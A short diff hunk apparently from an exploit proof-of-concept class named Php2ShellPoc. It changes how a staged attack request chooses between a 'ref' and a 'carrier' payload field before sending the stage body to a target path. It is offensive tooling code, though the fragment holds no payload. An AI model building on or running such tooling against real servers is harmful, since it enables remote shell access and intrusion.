@@ -244,7 +244,9 @@ final class Php2ShellPoc
                     $raw->sendNow($path, $a, self::PRELUDE_TYPE, $this->remaining($deadline), $cookie);
                     $this->wait(300_000, $onTick);
 
-                    $builder->stage3B($b, $payload['ht'], $payload['ref'], $payload['carrier']);
+                    $ref = $profile->stage3Carrier() ? null : $payload['ref'];
+                    $carrier = $profile->stage3Carrier() ? $payload['carrier'] : null;
+                    $builder->stage3B($b, $payload['ht'], $ref, $carrier);
                     $this->tick($onTick);
                     $raw->sendBody($path, $b, self::STAGE_TYPE, 65536, 30.0);
                 } catch (ScanCancelled|ScanRestart $e) {
